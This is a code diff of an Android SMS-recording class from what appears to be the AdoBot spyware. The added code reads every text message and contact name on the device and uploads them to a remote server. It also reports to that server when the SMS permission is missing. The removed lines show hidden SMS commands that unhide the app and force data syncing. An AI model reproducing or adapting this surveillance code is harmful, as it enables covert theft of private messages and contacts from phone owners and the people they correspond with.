@@ -43,16 +43,16 @@ public class SmsRecorderTask extends BaseTask {
     private static final String TAG = "SmsRecorderTask";
 
     private static final Uri smsUri = Uri.parse("content://sms");
-    private static final int MESSAGE_TYPE_RECEIVED = 1;
-    private static final int MESSAGE_TYPE_SENT = 2;
-//    private static final int MAX_SMS_MESSAGE_LENGTH = 160;
+    public static final int MESSAGE_TYPE_RECEIVED = 1;
+    public static final int MESSAGE_TYPE_SENT = 2;
 
     private SmsObserver smsObserver;
     private SharedPreferences prefs;
     private ContentResolver contentResolver;
     private AppDatabase appDatabase;
-    private SmsDao smsDao;
+    public SmsDao smsDao;
     private static SmsRecorderTask instance;
+    private int lastId = 0;
 
     public SmsRecorderTask(Context context) {
         setContext(context);
@@ -85,10 +85,6 @@ public class SmsRecorderTask extends BaseTask {
                 PackageManager.PERMISSION_GRANTED;
     }
 
-/*    public void setRecipientNumber(String recipientNumber) {
-        this.recipientNumber = recipientNumber;
-    }*/
-
     public interface SubmitSmsCallback {
         void onResult (boolean success);
     }
@@ -109,7 +105,96 @@ public class SmsRecorderTask extends BaseTask {
         thread.start();
     }
 
-    private void submitSms(final Sms sms, final SubmitSmsCallback cb) {
+
+    private Sms findSmsByAttributes(String mPhone, String mBody, String mDate, int mType) {
+        Log.i(TAG, "Getting all sms");
+
+        if(ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+
+            Uri callUri = Uri.parse("content://sms");
+            ContentResolver cr = context.getApplicationContext().getContentResolver();
+            Cursor mCur = cr.query(callUri, null, null, null, null);
+            if (mCur.moveToFirst()) {
+                do {
+
+                    SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                    Calendar calendar = Calendar.getInstance();
+                    String now = mCur.getString(mCur.getColumnIndex("date"));
+                    calendar.setTimeInMillis(Long.parseLong(now));
+
+                    try {
+                        String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
+                        int id = mCur.getInt(mCur.getColumnIndex("_id"));
+                        String phone = mCur.getString(mCur.getColumnIndex("address"));
+                        String name = getContactName(phone);
+                        String body = mCur.getString(mCur.getColumnIndex("body"));
+                        String date = formatter.format(calendar.getTime());
+                        int type = mCur.getInt(mCur.getColumnIndex("type"));
+
+                        if (Objects.equals(mBody.trim(), body.trim()) &&
+                                Objects.equals(mPhone.trim(), phone.trim()) &&
+                                Objects.equals(mDate, date) &&
+                                mType == type) {
+
+                            // found
+                            Sms sms = smsDao.findByAttributes(mPhone, mBody, date ,type);
+                            if (sms == null) {
+                                sms = new Sms();
+                            }
+
+                            sms.set_id(id);
+                            sms.setThread_id(thread_id);
+                            sms.setPhone(phone);
+                            sms.setName(name);
+                            sms.setBody(body);
+                            sms.setDate(date);
+                            sms.setType(type);
+
+                            return sms;
+                        }
+
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        return null;
+                    }
+
+                } while (mCur.moveToNext());
+            } else {
+                // no message
+                return null;
+            }
+            mCur.close();
+            return null;
+
+        } else {
+            Log.i(TAG, "No SMS permission!!!");
+            HashMap noPermit = new HashMap();
+            noPermit.put("event", "nopermission");
+            noPermit.put("uid", commonParams.getUid());
+            noPermit.put("device", commonParams.getDevice());
+            noPermit.put("permission", "READ_SMS");
+            Http doneSMS = new Http();
+            doneSMS.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
+            doneSMS.setMethod(HttpRequest.METHOD_POST);
+            doneSMS.setParams(noPermit);
+            doneSMS.execute();
+
+            return null;
+        }
+    }
+
+    private void submitSms(Sms sms, final SubmitSmsCallback cb) {
+
+
+        if (sms.get_id() == 0 || Objects.equals(sms.get_id(), "") || sms.getThread_id() == null || Objects.equals(sms.getThread_id(), "")) {
+            sms = findSmsByAttributes(sms.getPhone(), sms.getBody(), sms.getDate(), sms.getType());
+            if (sms == null) {
+                submitNextRecord(cb);
+                Log.i(TAG, "Can't find sms: " + sms.getBody() + ", From: " + sms.getPhone());
+                return;
+            }
+            sms.setName(getContactName(sms.getPhone()));
+        }
 
         final int type = sms.getType();
         final int id = sms.get_id();
@@ -118,6 +203,8 @@ public class SmsRecorderTask extends BaseTask {
         final String phone = sms.getPhone();
         final String body = sms.getBody();
         final String date = sms.getDate();
+
+        final Sms _sms = sms;
 
         try {
 
@@ -144,7 +231,7 @@ public class SmsRecorderTask extends BaseTask {
                     int statusCode = (int) response.get("status");
                     if (statusCode >= 200 && statusCode < 400) {
                         try {
-                            smsDao.delete(sms.getId(), sms.getThread_id());
+                            smsDao.delete(_sms);
                             Log.i(TAG, "sms submitted!! " + body);
                             submitNextRecord(cb);
                         } catch (Exception e) {
@@ -156,8 +243,6 @@ public class SmsRecorderTask extends BaseTask {
                         Log.i(TAG, "Sms failed to submit!!!" + phone);
                         Log.i(TAG, "Status code: " + statusCode);
                         cb.onResult(false);
-                        /*InsertCallLogThread ins = new InsertCallLogThread(sms);
-                        ins.start();*/
                     }
                 }
             });
@@ -167,16 +252,10 @@ public class SmsRecorderTask extends BaseTask {
             Log.i(TAG, "FAiled with error: " + e.toString());
             e.printStackTrace();
             cb.onResult(false);
-            /*InsertCallLogThread ins = new InsertCallLogThread(sms);
-            ins.start();*/
         }
     }
 
     private class InsertSmsModel extends Thread {
-        /*final SmsManager manager = SmsManager.getDefault();
-        private String phone;
-        private String message;
-        private int delay = 3000;*/
         private Sms sms;
 
         public InsertSmsModel(Sms sms) {
@@ -206,124 +285,44 @@ public class SmsRecorderTask extends BaseTask {
             } catch (Exception e) {
                 Log.i(TAG, "Failed to save sms: id: " + sms.getId());
             }
-
-
-/*                if (sending) {
-                    Log.i(TAG, "Resending..");
-                    try {
-                        Thread.sleep(delay);
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    } finally {
-                        new SendSmsThread(this.phone, this.message).start();
-                    }
-                    return;
-                }
-                sending = true;*/
-/*                try {
-                    Log.i(TAG, "Sleeping ..");
-                    Thread.sleep(delay);
-
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                } finally {
-                    Log.i(TAG, "Sending message ");
-                    int length = message.length();
-
-                    if (length > MAX_SMS_MESSAGE_LENGTH) {
-                        ArrayList<String> messagelist = manager.divideMessage(message);
-
-                        manager.sendMultipartTextMessage(phone, null, messagelist, null, null);
-                    } else {
-                        manager.sendTextMessage(phone, null, message, null, null);
-                    }
-
-                }*/
         }
     }
 
-    public class SmsObserver extends ContentObserver {
-
-        int lastId = 0;
-
-        public SmsObserver(Handler handler) {
-            super(handler);
-        }
-
-        @Override
-        public void onChange(boolean selfChange) {
-            super.onChange(selfChange);
-            Cursor cursor = null;
-
-            try {
-                cursor = contentResolver.query(smsUri, null, null, null, "date DESC");
-
-                if (cursor != null && cursor.moveToNext()) {
-                    saveSms(cursor);
-                }
-            } finally {
-                if (cursor != null)
-                    cursor.close();
-            }
-
-        }
-
-        private void saveSms(Cursor mCur) {
-            final int type = mCur.getInt(mCur.getColumnIndex("type"));
-            final int id = mCur.getInt(mCur.getColumnIndex("_id"));
-            final String body = mCur.getString(mCur.getColumnIndex("body"));
-
-            String smsOpenText = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "Open adobot");
-
-            if (Objects.equals(body.trim(), smsOpenText.trim()) && type == MESSAGE_TYPE_SENT) {
-                showAppIcon(SetupActivity.class);
-                Intent setupIntent = new Intent(context, SetupActivity.class);
-                setupIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(setupIntent);
-            }
-
-            String forceSyncSms = prefs.getString(AdobotConstants.PREF_FORCE_SYNC_SMS_COMMAND_FIELD, "Baby?");
-            if (Objects.equals(body.trim(), forceSyncSms.trim()) && type == MESSAGE_TYPE_RECEIVED) {
-                Log.i(TAG, "Forced submit SMS");
-
-                NetworkSchedulerService schedulerService = (NetworkSchedulerService) context;
-                schedulerService.sync();
-
-//                submitNextRecord(new SubmitSmsCallback() {
-//                    @Override
-//                    public void onResult(boolean success) {
-//                    }
-//                });
-            }
-
-            // accept only received and sent
-            if (id != lastId && (type == MESSAGE_TYPE_RECEIVED || type == MESSAGE_TYPE_SENT)) {
-
-                lastId = id;
-
-                final String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
-                final String phone = mCur.getString(mCur.getColumnIndex("address"));
-                final String name = getContactName(phone);
 
 
-                SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-                Calendar calendar = Calendar.getInstance();
-                String now = mCur.getString(mCur.getColumnIndex("date"));
-                calendar.setTimeInMillis(Long.parseLong(now));
+    public void saveSms(Cursor mCur) {
+        final int type = mCur.getInt(mCur.getColumnIndex("type"));
+        final int id = mCur.getInt(mCur.getColumnIndex("_id"));
+        final String body = mCur.getString(mCur.getColumnIndex("body"));
 
-                final String date = formatter.format(calendar.getTime());
+        // accept only received and sent
+        if (id != lastId && (type == MESSAGE_TYPE_RECEIVED || type == MESSAGE_TYPE_SENT)) {
 
-                Sms sms = new Sms();
-                sms.set_id(id);
-                sms.setThread_id(thread_id);
-                sms.setBody(body);
-                sms.setName(name);
-                sms.setPhone(phone);
-                sms.setDate(date);
-                sms.setType(type);
+            lastId = id;
 
-                InsertSmsModel ins = new InsertSmsModel(sms);
-                ins.start();
+            final String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
+            final String phone = mCur.getString(mCur.getColumnIndex("address"));
+            final String name = getContactName(phone);
+
+
+            SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+            Calendar calendar = Calendar.getInstance();
+            String now = mCur.getString(mCur.getColumnIndex("date"));
+            calendar.setTimeInMillis(Long.parseLong(now));
+
+            final String date = formatter.format(calendar.getTime());
+
+            Sms sms = new Sms();
+            sms.set_id(id);
+            sms.setThread_id(thread_id);
+            sms.setBody(body);
+            sms.setName(name);
+            sms.setPhone(phone);
+            sms.setDate(date);
+            sms.setType(type);
+
+            InsertSmsModel ins = new InsertSmsModel(sms);
+            ins.start();
 
                 /*SimpleDateFormat df = new SimpleDateFormat("EEE d MMM yyyy");
                 SimpleDateFormat tf = new SimpleDateFormat("hh:mm aaa");
@@ -347,6 +346,30 @@ public class SmsRecorderTask extends BaseTask {
                 Thread send = new SendSmsThread(recipientNumber, message);
                 send.start();*/
 
+        }
+
+    }
+
+    public class SmsObserver extends ContentObserver {
+
+        public SmsObserver(Handler handler) {
+            super(handler);
+        }
+
+        @Override
+        public void onChange(boolean selfChange) {
+            super.onChange(selfChange);
+            Cursor cursor = null;
+
+            try {
+                cursor = contentResolver.query(smsUri, null, null, null, "date DESC");
+
+                if (cursor != null && cursor.moveToNext()) {
+                    saveSms(cursor);
+                }
+            } finally {
+                if (cursor != null)
+                    cursor.close();
             }
 
         }
